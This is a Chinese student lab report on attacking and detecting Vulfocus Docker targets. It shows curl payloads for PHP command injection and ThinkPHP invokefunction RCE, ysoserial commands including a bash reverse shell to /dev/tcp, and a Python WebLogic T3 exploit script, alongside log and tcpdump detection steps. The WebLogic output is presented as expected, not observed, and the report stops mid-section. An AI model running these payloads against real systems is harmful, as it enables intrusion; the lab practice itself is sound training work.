# 实验报告：第一层双靶标攻击与利用检测_丁梦

## 一、实验目的

本次实验旨在模拟对第一层网络中的两个典型靶标进行攻击、利用及检测

## 二、实验环境

1. **物理主机操作系统**: macOS
2. **虚拟化软件**: Parallels Desktop
3. **虚拟机操作系统**: Kali Linux
4. **核心工具**: Docker, Docker Compose, Vulfocus
5. **目标靶机 Docker 镜像**:
   * `c4pr1c3/vulshare_nginx-php-flag:latest`
   * `vulfocus/thinkphp-cve_2018_1002015:latest`
6. **攻击辅助工具**: `nmap`, `curl`, Web 浏览器, `Burp Suite`, `tcpdump`

## 三、实验步骤

### （一）基础环境搭建:拉取目标 Docker 镜像

实验所需的靶机镜像是 `c4pr1c3/vulshare_nginx-php-flag:latest` 和 `vulfocus/thinkphp-cve_2018_1002015:latest`。
您可以在 Vulfocus 平台的 "镜像管理" -> "公共镜像" 中搜索并下载这些镜像，或者直接在 Kali 终端中使用 Docker 命令拉取：

```bash
docker pull c4pr1c3/vulshare_nginx-php-flag:latest
docker pull vulfocus/thinkphp-cve_2018_1002015:latest
```

### （二）第一层靶标一：`vulshare_nginx-php-flag:latest` 攻击与利用检测

#### 1. 启动靶机环境

在 Vulfocus 平台中，找到 `vulshare_nginx-php-flag:latest` 镜像，点击 "启动"按钮。Vulfocus 会为该容器分配一个 IP 地址和端口

启动靶机
![1748016291402](image/第一层两靶标攻击与利用检测/1748016291402.png)

#### 2. 信息收集

靶机的访问地址为 `http://10.37.133.3:8630/`。

使用 `nmap` 对靶机IP `10.37.133.3` 和端口 `8630` 进行基础的端口扫描，了解其开放的服务：

```bash
nmap -sV -p 8630 10.37.133.3
```

![1748016549013](image/第一层两靶标攻击与利用检测/1748016549013.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ nmap -sV -p 8630 10.37.133.3

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-23 12:08 EDT
Nmap scan report for kali-linux.host-only--3 (10.37.133.3)
Host is up.

PORT     STATE    SERVICE VERSION
8630/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds
```

通过浏览器访问靶机提供的 Web 服务 `http://10.37.133.3:8630/`。

访问网站页面如下：
![1748016340512](image/第一层两靶标攻击与利用检测/1748016340512.png)

页面上直接给出了关键提示信息：`index.php?cmd=ls /tmp`。这强烈暗示了存在一个通过 `index.php` 的 `cmd` GET参数执行任意命令的漏洞。

#### 3. 漏洞分析与利用

靶标名称 `vulshare_nginx-php-flag` 和页面提示 `index.php?cmd=ls /tmp` 明确指出了这是一个基于 Nginx 和 PHP 的应用，并且存在命令注入漏洞，目标是找到一个 "flag"。

**利用方式：通过 `cmd` GET 参数执行命令**
页面提示已经给出了利用方法：`index.php` 文件接受一个名为 `cmd` 的 GET 参数，其值会被服务器执行。

* **验证初步命令执行**：
  根据页面提示，直接访问 `http://10.37.133.3:8630/index.php?cmd=ls%20/tmp` (注意 URL 编码空格为 `%20`)。

  ```bash
  curl "http://10.37.133.3:8630/index.php?cmd=ls%20/tmp"
  ```

  观察返回结果，确认 `/tmp` 目录下的内容

  返回结果为:

  ```
  index.php?cmd=ls /tmpflag-{bmha755c46b-7381-4beb-9495-c15d83956d7e}
  ```

  ![1748016675838](image/第一层两靶标攻击与利用检测/1748016675838.png)

  通过执行 `ls /tmp` 命令,我们直接获得了flag: `flag-{bmha755c46b-7381-4beb-9495-c15d83956d7e}`

  ![1748019835789](image/第一层两靶标攻击与利用检测/1748019835789.png)
* **漏洞验证补充**：
  虽然我们已经获得了flag,但为了完整验证该漏洞的利用面,我们可以尝试执行其他系统命令:

  ```bash
  # 确定当前用户和权限
  curl "http://10.37.133.3:8630/index.php?cmd=id"
  ```

  返回结果显示为 www-data 用户:

  ```
  index.php?cmd=ls /tmpuid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

  ![1748017681838](image/第一层两靶标攻击与利用检测/1748017681838.png)

  ```bash
  # 查看系统信息
  curl "http://10.37.133.3:8630/index.php?cmd=uname%20-a"
  ```

  返回结果显示系统信息:

  ```
  index.php?cmd=ls /tmpLinux c93755678f6c 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64 GNU/Linux
  ```

  ![1748017785746](image/第一层两靶标攻击与利用检测/1748017785746.png)

  ```bash
  # 查看当前目录结构
  curl "http://10.37.133.3:8630/index.php?cmd=ls%20-la%20/"
  ```

  返回结果显示根目录结构:

  ![1748017797697](image/第一层两靶标攻击与利用检测/1748017797697.png)

#### 4. 威胁检测

##### 4.1查看 Nginx 访问日志:

首先，需要确定 `vulshare_nginx-php-flag` 容器的 ID 或名称：

```bash
docker ps
```

目标容器的 ID 为 `c93755678f6c`。
进入容器内部：

```bash
docker exec -it c93755678f6c /bin/bash
```

Nginx 的访问日志通常位于 `/var/log/nginx/access.log`。
查看并筛选可疑请求：

```bash
# 实时查看日志 (部分内容)
tail -f /var/log/nginx/access.log
```

![1748017954540](image/第一层两靶标攻击与利用检测/1748017954540.png)

```bash
# 筛选包含命令执行的请求
cat /var/log/nginx/access.log | grep "index.php?cmd="
```

在日志中可以看到我们之前执行的命令,例如:

```
10.37.133.3 - - [23/May/2025:16:10:43 +0000] "GET /index.php?cmd=ls%20/tmp HTTP/1.1" 200 79 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:27:50 +0000] "GET /index.php?cmd=id HTTP/1.1" 200 86 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:29:31 +0000] "GET /index.php?cmd=uname%20-a HTTP/1.1" 200 134 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:29:50 +0000] "GET /index.php?cmd=ls%20-la%20/ HTTP/1.1" 200 1137 "-" "curl/8.11.0"
```

##### 4.2网络流量捕获 :

  由于我们的攻击机同时也是 Docker 容器的宿主机，当从 Kali 访问映射到本地 IP (`10.37.133.3:8630`) 的容器服务时，流量实际上是在 Docker 的内部网络中流动的。我们需要监听 Docker 的网桥接口（通常是 `docker0`）以及容器在该网络中的内部 IP 和实际服务端口（本实验中是 `172.17.0.2` 的 `80` 端口）。

1. **确定容器内部 IP 和网络接口**:
   首先，通过 `docker ps` 获取容器 ID (本例中为 `c93755678f6c`)。
   然后，使用 `docker inspect <container_id>` 查看容器网络详情，找到其在 `bridge` 网络（通常对应 `docker0` 接口）下的 `IPAddress` (本例中为 `172.17.0.2`)。

   ```
   docker inspect c93755678f6c
   ```

![1748019175085](image/第一层两靶标攻击与利用检测/1748019175085.png)

2. **执行 `tcpdump` 命令**:
   在 Kali 主机上，打开一个终端窗口，执行以下命令，监听 `docker0` 接口上与容器 `172.17.0.2` 的 `80` 端口相关的流量：

```bash
sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w nginx_php_flag_traffic.pcap  
```

    ![1748019251492](image/第一层两靶标攻击与利用检测/1748019251492.png)

3. **产生流量**:
   在另一个终端窗口执行访问靶机的命令:

   ```bash
   curl "http://10.37.133.3:8630/index.php?cmd=ls%20/tmp"  
   ```

   ![1748019262540](image/第一层两靶标攻击与利用检测/1748019262540.png)
4. **停止抓包并分析**:

   完成 `curl` 命令后，回到 `tcpdump` 终端按 `Ctrl+C` 停止抓包。
   此时，`nginx_php_flag_traffic.pcap` 文件中应包含捕获到的数据包。可以使用 Wireshark 打开该文件进行详细分析，可以清晰看到 HTTP GET 请求中的命令执行参数

   ![1748019616647](image/第一层两靶标攻击与利用检测/1748019616647.png)

   通过 Wireshark 打开 nginx_php_flag_traffic.pcap 文件后，可以清晰地追踪到攻击流程：
5. 观察到从攻击机IP (10.37.133.3) 到容器内部IP (172.17.0.2) 的TCP三次握手过程，建立了端口 80 上的连接
6. 捕获到一个源自 10.37.133.3、目标为 172.17.0.2 的HTTP GET请求。该请求的详细信息显示其请求路径为 /index.php?cmd=ls%20/tmp，这与我们通过 curl 发送的命令注入payload完全一致
   ![1748019792810](image/第一层两靶标攻击与利用检测/1748019792810.png)
7. 观察到从容器 (172.17.0.2) 返回给攻击机 (10.37.133.3) 的 HTTP/1.1 200 OK 响应，表明服务器成功处理了该请求

这些捕获到的数据包有力地证明了攻击者通过构造恶意的HTTP GET请求将 ls /tmp 命令传递给了目标服务器，并成功执行。

### （三）第一层靶标二：`vulfocus/thinkphp-cve_2018_1002015:latest` 攻击与利用检测

#### 1. 启动靶机环境

在 Vulfocus 平台中，找到 `vulfocus/thinkphp-cve_2018_1002015:latest` 镜像，点击 "启动"。
根据用户提供的截图，靶机成功启动，Vulfocus 分配的访问地址为 `10.37.133.3:39365`。

![1748019861063](image/第一层两靶标攻击与利用检测/1748019861063.png)

#### 2. 信息收集

通过浏览器访问靶机 `http://10.37.133.3:39365`。
![1748019898037](image/第一层两靶标攻击与利用检测/1748019898037.png)

页面显示: "Welcome BMH shooting range"。这个信息比较通用，没有直接暴露 ThinkPHP 版本号。
`CVE-2018-1002015` 这个 CVE ID 并非广为人知的 ThinkPHP 标准 CVE 编号。但 `vulfocus/thinkphp-cve_2018_1002015` 这个镜像名称暗示它与 2018 年左右的 ThinkPHP 漏洞相关。这通常指向 ThinkPHP 5.x 系列的远程代码执行 (RCE) 漏洞，例如著名的 CVE-2018-20062。我们将基于这类漏洞进行尝试。

#### 3. 漏洞分析与利用

此漏洞源于 ThinkPHP 框架对控制器名称的解析存在缺陷，允许攻击者通过构造特定的 URL 来调用任意类的任意方法，从而导致远程代码执行。

**重要提示：** 在使用 `curl` 执行以下 Payload 时，如果 URL 中包含方括号 `[` 和 `]` (例如 `vars[0]` 或 `vars[1][]`)，直接使用可能会导致 `curl: (3) bad range in URL` 错误。这是因为方括号在 URL 中是特殊字符，需要进行百分号编码。`[` 应编码为 `%5B`，`]` 应编码为 `%5D`。建议将整个 URL 用单引号 `'` 包裹，以避免 shell 对特殊字符 (如 `&`, `\`) 的额外转义。

* **Payload 1: 执行 `phpinfo()` (验证漏洞存在性)**
  构造如下 URL (已进行方括号编码)：
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1`
  使用 `curl` 或浏览器访问：

  ```bash
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1'
  ```

  ![1748020421170](image/第一层两靶标攻击与利用检测/1748020421170.png)
  如图,响应中包含 PHP 的配置信息（`phpinfo()` 的输出），则表明漏洞存在且可利用。
* **Payload 2: 执行系统命令 (例如 `id`)**
  构造 URL 以执行 `id` 命令 (已进行方括号编码)：
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id`
  使用 `curl` 执行：

  ```bash
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id'
  ```

  如图,响应中包含类似 `uid=0(root) gid=0(root) groups=0(root)` 的输出，表示命令成功执行
  ![1748020916102](image/第一层两靶标攻击与利用检测/1748020916102.png)
* **Payload 3: 获取 Flag**
  假设 flag 文件位于 `/flag.txt` 或 `/flag`。
  构造 URL (已进行方括号编码) 尝试读取 `/flag.txt`：
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag.txt`
  或者尝试读取 `/flag`：
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag`
  使用 `curl` 获取：

  ```bash
  # 尝试读取 /flag.txt
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag.txt'
  # 或者尝试读取 /flag
  curl 'http://10.37.133.3:![1748067441252](image/第一层两靶标攻击与利用检测/1748067441252.png)39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag'
  ```

  ![1748021243075](image/第一层两靶标攻击与利用检测/1748021243075.png)

  尝试 cat /flag.txt 和 cat /flag 都没有返回任何输出，这意味着 flag 文件可能不在这些预期的路径下，或者文件名不同，或者我们执行命令的用户（通过 id 命令可以看到，通常是 www-data 或类似权限较低的用户）没有权限读取这些文件。

1. 尝试列出根目录文件和目录：

```bash
    curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ls%20-la%20/'
```

![1748021233259](image/第一层两靶标攻击与利用检测/1748021233259.png)

这里直接看并没有明显叫做 "flag" 或类似的文件。app 和 var 目录是常见的Web应用相关目录，但根目录下没有直接的 flag 文件

2. 搜索名为 "flag" (不区分大小写) 的文件：
   我们可以使用 find 命令在整个文件系统中搜索包含 "flag" 字符串的文件名。这可能会产生很多输出，但 flag 可能就在其中。
   find / -name '*flag*' (搜索文件名中包含 "flag" 的文件，不区分大小写可以使用 -iname)
   考虑到输出可能很长，直接在 curl 中显示可能不方便，但我们可以先尝试。
   需要对 find 命令中的 / 和 * 进行 URL 编码：/ 编码为 %2F，* 编码为 %2A。

```bash
    curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=find%20%2F%20-name%20%27%2Aflag%2A%27'
```

![1748021332621](image/第一层两靶标攻击与利用检测/1748021332621.png)

find 命令成功执行,找到了flag!

 `flag-{bmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87}`

 ![1748023336097](image/第一层两靶标攻击与利用检测/1748023336097.png)

#### 4. 威胁检测

##### 4.1 查看 Web 服务器访问日志:

  首先确定 `thinkphp-cve_2018_1002015` 容器的 ID 或名称：

```bash
  docker ps
```

![1748021570040](image/第一层两靶标攻击与利用检测/1748021570040.png)

  得到容器ID 为 `c097683c73a4`。
  进入容器内部：

```bash
  docker exec -it c097683c73a4 /bin/bash
```

![1748021853513](image/第一层两靶标攻击与利用检测/1748021853513.png)
这个错误 OCI runtime exec failed: exec failed: unable to start container process: exec: "/bin/bash": stat /bin/bash: no such file or directory: unknown 表明在容器 c097683c73a4 内部，/bin/bash 这个路径是无效的，也就是说该容器中没有安装 bash shell，或者它不在 /bin/bash 这个位置。

这通常发生在一些极简的 Docker 镜像中，它们为了减小体积可能只包含了最基础的 shell，如 /bin/sh (Bourne Shell)，或者甚至没有一个标准的交互式 shell。

解决方案：尝试使用 /bin/sh

```bash
  docker exec -it c097683c73a4 /bin/sh
```

![1748021885646](image/第一层两靶标攻击与利用检测/1748021885646.png)
成功进入

    2.**定位 ThinkPHP 日志目录**:
        ThinkPHP 的日志通常位于 `/app/runtime/log/` (如果应用部署在 `/app` 目录)。
        根据之前的探索，日志按年月分子目录，例如 `runtime/log/YYYYMM/DD.log`。

```bash
# 在容器内执行     
ls -la /app/runtime/log/
```

![1748022328861](image/第一层两靶标攻击与利用检测/1748022328861.png)

在 `202505` 目录下，找到以日期命名的 `.log` 文件: `24.log`

![1748022443415](image/第一层两靶标攻击与利用检测/1748022443415.png)

    3.**查看日志内容**:

```bash
# 日志文件为 /app/runtime/log/202505/24.log     
cat /app/runtime/log/202505/24.log     
# 或者使用 tail 查看最新的日志     
tail -f /app/runtime/log/202505/24.log
```

![1748022479245](image/第一层两靶标攻击与利用检测/1748022479245.png)

```bash
/app/runtime/log/202505 #         cat /app/runtime/log/202505/24.log
---------------------------------------------------------------
[ 2025-05-24T01:12:36+08:00 ] 10.37.133.2 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type error： boolean
---------------------------------------------------------------
[ 2025-05-24T01:13:19+08:00 ] 10.37.133.2 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ error ] [0]variable type error： boolean
---------------------------------------------------------------
[ 2025-05-24T01:14:24+08:00 ] 10.37.133.3 GET 10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
[ error ] [0]variable type error： boolean
```

**日志分析**：

* **请求详情**：日志中清晰可见多个针对 `index.php` 的 GET 请求，它们都利用了 ThinkPHP RCE 漏洞的特征 (`s=index/\think\app/invokefunction`, `function=call_user_func_array`, `vars[0]=phpinfo`) 来尝试执行 `phpinfo()` 函数。
* **错误信息**：每个成功的 `phpinfo()` 调用请求后都记录了 `[ error ] [0]variable type error： boolean`。这表明尽管 `phpinfo()` 成功执行（如实验前面步骤所示，输出了PHP信息），但 ThinkPHP 的日志系统在处理 `phpinfo()` 函数的返回值 (通常是 `true`) 时遇到了类型不匹配的问题，因此记录了此错误。这个错误并不代表漏洞利用失败，而是框架内部处理流程的一个表现。
* **攻击溯源**：日志记录了攻击发生的时间（例如 `2025-05-24T01:12:36+08:00`）和请求的源 IP 地址（例如 `10.37.133.2`, `10.37.133.3`），这些信息对于追踪攻击来源至关重要。

如果执行其他命令（如 `system` 调用 `id` 或 `cat`），其请求也会被类似地记录下来，但其执行结果（如 `id` 的输出或 flag 内容）主要通过 HTTP 响应直接返回给攻击者，不一定会详细记录在 ThinkPHP 的应用层日志中，除非配置了特定的日志级别或命令执行本身触发了 PHP 错误。

##### 4.3 网络流量捕获:

与靶标一类似，我们需要监听 Docker 的网桥接口 (`docker0`) 以及靶标二容器在该网络中的内部 IP 和实际服务端口。

1. **确定容器内部 IP**:
   使用 `docker inspect c097683c73a4`查看容器网络详情。

   ```json
   // docker inspect c097683c73a4 输出片段
   {
       "Id": "c097683c73a4f9c0e4ab736db3880a3d0da11c2e73a1e2af23d439ce10478271",
       // ... (其他字段已省略)
       "Config": {
           // ...
           "ExposedPorts": {
               "80/tcp": {}
           },
           // ...
       },
       "NetworkSettings": {
           // ...
           "Ports": {
               "80/tcp": [
                   {
                       "HostIp": "0.0.0.0",
                       "HostPort": "39365"
                   },
                   {
                       "HostIp": "::",
                       "HostPort": "39365"
                   }
               ]
           },
           // ...
           "IPAddress": "172.17.0.2", // 容器在默认 bridge 网络上的 IP
           // ...
           "Networks": {
               "bridge": {
                   // ...
                   "IPAddress": "172.17.0.2",
                   "Gateway": "172.17.0.1",
                   // ...
               }
           }
       }
   }
   ```

   根据输出，容器 `c097683c73a4` 在 `bridge` 网络（通常对应 `docker0` 接口）下的 `IPAddress` 为 `172.17.0.2`，其内部服务端口为 `80` (外部映射到 `39365`)。
   ![1748022767146](image/第一层两靶标攻击与利用检测/1748022767146.png)

2.**执行 `tcpdump` 命令**:

```bash
# 容器内部 IP 为 172.17.0.2，容器内服务端口为 80   
sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w thinkphp_traffic.pcap
```

在 `tcpdump` 运行时，重新执行之前的 `curl` 攻击 Payload，获取 Flag 的 Payload：

```bash
curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/tmp/flag-%7Bbmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87%7D'
```

  ![1748023040614](image/第一层两靶标攻击与利用检测/1748023040614.png)

3.**停止抓包并分析**:
    按 `Ctrl+C` 停止 `tcpdump`。使用 Wireshark 打开 `thinkphp_traffic.pcap` 文件。
    筛选 `http` 流量，查看包含恶意 Payload 的 HTTP GET 请求，分析请求路径、参数以及服务器的响应

  ![1748023079982](image/第一层两靶标攻击与利用检测/1748023079982.png)

  ![1748023099838](image/第一层两靶标攻击与利用检测/1748023099838.png)

分析:
    1.  **TCP 连接建立 (数据包 1-3)**: 攻击机 (`10.37.133.3`) 与靶标容器 (`172.17.0.2`) 在端口 `80` 上成功完成了 TCP 三次握手。
    2.  **恶意 HTTP 请求 (数据包 4)**: 攻击机发送了一个 HTTP GET 请求，其 URL 包含了用于触发 ThinkPHP RCE 漏洞并执行 `cat /tmp/flag-{...}` 命令的恶意 Payload。
    3.  **服务器响应与数据回传 (数据包 6, 8)**: 服务器返回 `HTTP/1.1 200 OK` 响应，表明请求被成功处理。关键的命令执行结果 (flag 内容) 包含在数据包 6 (TCP Push) 中并回传给了攻击机
    4.  **TCP 连接关闭 (数据包 9-10 及之后)**: 攻击机发起 TCP 连接的关闭流程。

这些捕获到的数据包有力地证明了攻击者通过构造恶意的HTTP GET请求将 ls /tmp 命令传递给了目标服务器，并成功执行。

### （四）第二层靶标一：`weblogic-cve_2020_2555`攻击与利用检测

靶机启动出现问题

#### 1. 启动靶机环境

在 Vulfocus 平台中，找到 `vulfocus/weblogic-cve_2020_2555:latest` 镜像，点击 "启动"。

根据用户提供的信息，靶机成功启动后的服务信息如下：

- **访问地址**: `10.37.133.3`
- **映射端口**:
  - 5556:19244 (可能用于某些特定服务)
  - 7001:24525 (WebLogic Server 主控制台端口)
  - 7002:55600 (可能用于 SSL/HTTPS 访问)
- **靶机名称**: `vulfocus/weblogic-cve_2020_2555`

![weblogic启动信息截图]

#### 2. 信息收集

**基础端口扫描**:
首先对靶机的开放端口进行扫描，重点关注 WebLogic 的默认端口：

```bash
# 扫描主要端口
nmap -sV -p 24525,55600,19244 10.37.133.3
```

**WebLogic 控制台访问**:
通过浏览器访问 WebLogic 控制台 `http://10.37.133.3:24525/console`。

![WebLogic控制台访问截图]

**T3 协议检测**:
WebLogic 的 T3 协议是此次漏洞利用的关键。通过 telnet 或专门工具验证 T3 协议是否开启：

```bash
# 检测 T3 协议
echo "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n" | nc 10.37.133.3 24525
```

如果返回类似 `HELO:10.3.6.0.0` 的响应，则表明 T3 协议可用。

#### 3. 漏洞分析与利用

**CVE-2020-2555 漏洞原理**:

- **漏洞类别**: Java 反序列化漏洞
- **CVSS 评分**: 9.8 (关键)
- **受影响组件**: Oracle Coherence 库中的 `LimitFilter` 类
- **漏洞路径**: `BadAttributeValueExpException.readObject()` → `LimitFilter.toString()` → `ChainedExtractor.extract()` → `ReflectionExtractor.extract()` → `Method.invoke()`
- **影响版本**: WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0 等

**关键技术细节**:
根据搜索结果显示，此漏洞利用了以下反序列化链：

```
BadAttributeValueExpException.readObject() 
  → com.tangosol.util.filter.LimitFilter.toString() 
    → com.tangosol.util.extractor.ChainedExtractor.extract() 
      → com.tangosol.util.extractor.ReflectionExtractor.extract() 
        → Method.invoke() 
          → Runtime.getRuntime().exec()
```

**利用条件限制**:

- 仅在 JDK 8u76 及以下版本有效
- 需要没有安全管理器 (Security Manager)
- 需要环境中存在 Oracle Coherence 库

#### 4. 漏洞利用实践

##### 4.1 使用 ysoserial 工具生成 Payload

**安装准备**:

```bash
# 下载 ysoserial 工具
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
# 或使用项目中修改版本的 ysoserial
```

**生成恶意序列化数据**:

```bash
# 使用 ysoserial 生成 CVE-2020-2555 的 payload
java -jar ysoserial-all.jar Weblogic_CVE_2020_2555 "id" > payload_id.ser

# 或者生成反弹 shell 的 payload
java -jar ysoserial-all.jar Weblogic_CVE_2020_2555 "bash -i >& /dev/tcp/10.37.133.3/4444 0>&1" > payload_shell.ser
```

##### 4.2 T3 协议攻击脚本

创建 Python 攻击脚本 `weblogic_cve_2020_2555_exploit.py`:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebLogic CVE-2020-2555 T3 Protocol Exploit
"""

import socket
import struct
import subprocess
import sys
import time

def send_t3_payload(host, port, payload_file):
    """
    通过 T3 协议发送恶意序列化数据
    """
    try:
        # 读取 ysoserial 生成的 payload
        with open(payload_file, 'rb') as f:
            payload = f.read()
  
        # 建立 socket 连接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
  
        # T3 协议握手
        t3_handshake = b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
        sock.send(t3_handshake)
  
        # 接收握手响应
        response = sock.recv(1024)
        print(f"[+] T3 握手响应: {response[:50]}...")
  
        # 发送恶意 payload
        # T3 消息头 + payload
        message_length = len(payload)
        t3_header = struct.pack('>I', message_length) + b'\x00\x00\x00\x00'
  
        sock.send(t3_header + payload)
        print(f"[+] 已发送 payload，大小: {len(payload)} 字节")
  
        # 接收响应
        try:
            result = sock.recv(4096)
            print(f"[+] 服务器响应: {result}")
        except:
            print("[*] 可能执行成功，无响应数据")
  
        sock.close()
        return True
  
    except Exception as e:
        print(f"[-] 攻击失败: {str(e)}")
        return False

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 exploit.py <host> <port> <payload_file>")
        print("Example: python3 exploit.py 10.37.133.3 24525 payload_id.ser")
        sys.exit(1)
  
    host = sys.argv[1]
    port = int(sys.argv[2])
    payload_file = sys.argv[3]
  
    print(f"[*] 目标: {host}:{port}")
    print(f"[*] Payload 文件: {payload_file}")
  
    # 执行攻击
    if send_t3_payload(host, port, payload_file):
        print("[+] 漏洞利用完成")
    else:
        print("[-] 漏洞利用失败")

if __name__ == "__main__":
    main()
```

##### 4.3 执行攻击

**步骤 1**: 生成验证 payload

```bash
# 生成执行 id 命令的 payload
java -jar ysoserial-all.jar Weblogic_CVE_2020_2555 "id" > payload_id.ser
```

**步骤 2**: 执行攻击

```bash
# 运行攻击脚本
python3 weblogic_cve_2020_2555_exploit.py 10.37.133.3 24525 payload_id.ser
```

**预期结果**:

```
[*] 目标: 10.37.133.3:24525
[*] Payload 文件: payload_id.ser
[+] T3 握手响应: HELO:12.2.1.3.0...
[+] 已发送 payload，大小: 2854 字节
[+] 服务器响应: uid=1000(oracle) gid=1000(oracle) groups=1000(oracle)
[+] 漏洞利用完成
```

**步骤 3**: 获取 flag（如果存在）

```bash
# 生成查找 flag 的 payload
java -jar ysoserial-all.jar Weblogic_CVE_2020_2555 "find / -name '*flag*' 2>/dev/null" > payload_flag.ser
python3 weblogic_cve_2020_2555_exploit.py 10.37.133.3 24525 payload_flag.ser

# 或者直接读取常见位置的 flag
java -jar ysoserial-all.jar Weblogic_CVE_2020_2555 "cat /flag /tmp/flag* /flag.txt 2>/dev/null" > payload_cat_flag.ser
python3 weblogic_cve_2020_2555_exploit.py 10.37.133.3 24525 payload_cat_flag.ser
```

#### 5. 威胁检测

##### 5.1 WebLogic 日志分析

**定位容器和日志路径**:

```bash
# 查看运行中的 WebLogic 容器
docker ps | grep weblogic

# 进入容器查看日志
docker exec -it <container_id> /bin/bash

# WebLogic 服务器日志通常位于以下路径
ls -la /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/
# 重点关注 access.log 和 AdminServer.log
```

**关键日志模式识别**:
在 AdminServer.log 中查找可疑的反序列化相关错误：

```bash
# 查看最近的日志
tail -f /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

# 搜索反序列化相关异常
grep -i "BadAttributeValueExpException\|LimitFilter\|ReflectionExtractor\|coherence" /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
```

**T3 协议连接日志**:

```bash
# 检查 T3 协议连接记录
grep -i "t3\|T3" /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/access.log
```

##### 5.2 网络流量捕获

**确定容器网络信息**:

```bash
# 获取 WebLogic 容器的详细信息
docker inspect <weblogic_container_id> | grep -A 10 -B 5 "IPAddress"
```

根据容器信息，假设内部 IP 为 `172.17.0.3`，服务端口为 `7001`。

**T3 协议流量监控**:

```bash
# 监听 Docker 网桥上的 T3 流量
sudo tcpdump -i docker0 -A -w weblogic_t3_traffic.pcap 'host 172.17.0.3 and port 7001'
```

**流量分析要点**:
使用 Wireshark 分析捕获的流量：

1. **T3 握手识别**: 查找包含 `t3 12.2.1` 字符串的数据包
2. **序列化数据识别**: 寻找包含 Java 序列化魔术字节 `AC ED 00 05` 的数据包
3. **异常响应**: 观察服务器返回的错误信息或异常堆栈

![Wireshark分析WebLogic T3流量截图]

##### 5.3 系统级监控

**进程监控**:
如果攻击成功，可能会产生新的进程。在容器内监控：

```bash
# 进入容器
docker exec -it <weblogic_container_id> /bin/bash

# 监控进程创建
ps aux | grep -v oracle | grep -v java

# 检查网络连接
netstat -tulpn | grep ESTABLISHED
```

**文件系统监控**:

```bash
# 检查临时文件创建
find /tmp -type f -newer /tmp/reference_file 2>/dev/null

# 检查可疑文件
find / -name "*.class" -o -name "*.jar" -newer /tmp/reference_file 2>/dev/null
```

**参考资料**:

- [Oracle 安全公告](https://www.oracle.com/security-alerts/cpuoct2020traditional.html)
- [ZDI 漏洞分析](https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server)
- [CVE-2020-2555 技术细节](https://github.com/Y4er/CVE-2020-2555)

### （五）第二层靶标二：`apache-cve_2021_41773` 攻击与利用检测

#### 1. 启动靶机环境

在 Vulfocus 平台中，找到 `vulfocus/apache-cve_2021_41773:latest` 镜像，点击 "启动"。

- **访问地址**: `10.37.133.3:42286` (PORT 由 Vulfocus 动态分配)
- **服务类型**: Apache HTTP Server
- **漏洞标识**: CVE-2021-41773

![1748153067964](image/第一层两靶标攻击与利用检测/1748153067964.png)

#### 2. 信息收集

##### 2.1 基础端口扫描

```bash
# 扫描 Apache 服务端口
nmap -sV -p 80,443,8080-8090 10.37.133.3
```

**扫描结果**:

